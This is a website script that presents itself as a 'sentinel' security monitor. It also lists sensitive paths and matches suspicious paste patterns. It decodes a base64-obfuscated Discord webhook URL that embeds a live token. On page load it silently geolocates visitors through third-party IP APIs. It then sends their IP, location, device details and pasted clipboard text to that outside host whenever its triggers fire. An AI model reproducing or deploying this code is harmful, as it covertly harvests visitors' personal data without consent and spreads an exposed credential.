(function() {
    // core config
    const _wh = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDI0Mzg2OTkwMDk5NjY5OC9RQVlCcGJ1SjA2Zm5QMjFtRVVIWTliYUZqUGFUMEhlWWNiUUJua3h1amdXUXJXWi1kaUlpdzBJaFB4UmJ6a3h6eVFmWQ==';
    const _url = atob(_wh);

    const uiqm = {
        last: 0,
        cooldown: 15000,

        async getInfo() {
            try {
                // Try multiple APIs for reliability
                const apis = [
                    'https://ipapi.co/json/',
                    'https://api.db-ip.com/v2/free/self',
                    'https://freeipapi.com/api/json'
                ];
                
                let data = {};
                for (const url of apis) {
                    try {
                        const res = await fetch(url, { signal: AbortSignal.timeout(3000) });
                        if (res.ok) {
                            data = await res.json();
                            break;
                        }
                    } catch(e) {}
                }

                return {
                    ip: data.ip || data.ipAddress || data.address || 'Unknown',
                    city: data.city || data.cityName || 'Unknown',
                    state: data.region || data.regionName || 'Unknown',
                    country: data.country_name || data.countryName || 'Unknown',
                    ua: navigator.userAgent,
                    plat: navigator.platform,
                    cpu: navigator.hardwareConcurrency || 'N/A',
                    mem: navigator.deviceMemory || 'N/A'
                };
            } catch (e) {
                return { ip: 'Unknown', city: 'Unknown', state: 'Unknown', country: 'Unknown', ua: navigator.userAgent };
            }
        },

        async log(type, msg) {
            const now = Date.now();
            if (now - this.last < this.cooldown) return;
            this.last = now;

            const info = await this.getInfo();
            const dateStr = new Date().toLocaleString();
            
            const payload = {
                username: "uiqm sentinel",
                embeds: [{
                    title: 'Security Alert: ' + type,
                    color: 16711680,
                    fields: [
                        { name: 'Attack Type', value: type },
                        { name: 'Attack Details', value: msg },
                        { name: 'Network Info', value: `IP: ||${info.ip}||\nCity: ${info.city}\nState: ${info.state}\nCountry: ${info.country}` },
                        { name: 'Device Info', value: `OS: ${info.plat}\nCPU: ${info.cpu} Cores | RAM: ${info.mem}GB\nUser-Agent: \`${info.ua}\`` },
                        { name: 'Time & Date', value: dateStr }
                    ],
                    footer: { text: 'UIQM Sentinel System' }
                }]
            };

            await fetch(_url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        },

        init() {
            // clock
            const updateClock = () => {
                const now = new Date();
                const timeStr = now.toLocaleTimeString('en-US', { hour12: true, hour: 'numeric', minute: '2-digit', second: '2-digit' });
                const clockEl = document.getElementById('live-clock');
                if (clockEl) clockEl.innerText = timeStr;
            };
            updateClock();
            setInterval(updateClock, 1000);

            // paste check
            window.addEventListener('paste', (e) => {
                const data = e.clipboardData.getData('text');
                if (!data) return;
                
                // Only alert on suspicious content, not plain URLs
                const isSuspicious = /<script|eval\(|function\(|process\.|fs\.|require\(|alert\(|console\.|window\.|document\.|javascript:|vbscript:/i.test(data);
                const isVeryLong = data.length > 500 && !data.includes(' ');
                
                if (isSuspicious || isVeryLong) {
                    this.log('Malicious Script Injection', `User pasted suspicious code: ${data.substring(0, 100)}...`);
                }
            });

            // paths
            const bad = ['/.env', '/package.json', '/config.js', '/.git', '/node_modules', '/api/v1', '/admin', '/login', '/wp-admin', '/phpmyadmin', '/config.php', '/settings.json', '/.htaccess', '/server-status'];
            const p = window.location.pathname.toLowerCase();
            bad.forEach(f => {
                if (p === f || p.startsWith(f + '/') || p.endsWith(f) || window.location.search.includes(f)) {
                    this.log('Subdomain / Directory Finder', `User probed hidden path: ${f} via ${window.location.href}`);
                    window.location.href = 'https://google.com';
                }
            });

            // shortcuts
            window.addEventListener('keydown', (e) => {
                if ((e.ctrlKey && e.key === 'U')) {
                    this.log('Source Code Probe', 'User attempted to View Source (Ctrl+U)');
                }
            });

            // Simple DDoS / Spam detection (Rapid Refresh)
            const count = parseInt(sessionStorage.getItem('refresh_count') || '0');
            const lastTime = parseInt(sessionStorage.getItem('last_refresh') || '0');
            const now = Date.now();
            
            if (now - lastTime < 2000) {
                const newCount = count + 1;
                sessionStorage.setItem('refresh_count', newCount);
                if (newCount > 5) {
                    this.log('Possible DDoS / Bot Attack', `User is refreshing rapidly (${newCount} times in short succession)`);
                    sessionStorage.setItem('refresh_count', '0');
                }
            } else {
                sessionStorage.setItem('refresh_count', '0');
            }
            sessionStorage.setItem('last_refresh', now);
        }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => uiqm.init());
    } else {
        uiqm.init();
    }
    console.log('%c uiqm sentinel active', 'color: cyan; font-weight: bold;');
})();
